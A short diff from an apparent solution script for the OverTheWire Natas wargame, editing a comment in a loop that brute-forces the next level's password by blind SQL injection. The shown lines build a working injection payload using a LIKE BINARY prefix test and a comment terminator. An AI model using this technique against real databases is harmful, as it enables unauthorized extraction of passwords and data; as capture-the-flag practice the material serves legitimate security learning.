@@ -26,7 +26,7 @@ print("".join(password_char_data))
 print("\n[*] Starting brute-force...")
 natas16_password = ""
 
-while len(natas16_password) < 32:  # Natas passwords are 32 characters, via the previous passwords.
+while len(natas16_password) < 32:  # Natas passwords are no longer then 32 characters, via the previous passwords.
     for char in password_char_data:
         attempt = natas16_password + char
         injection = f'natas16" AND password LIKE BINARY "{attempt}%" -- '
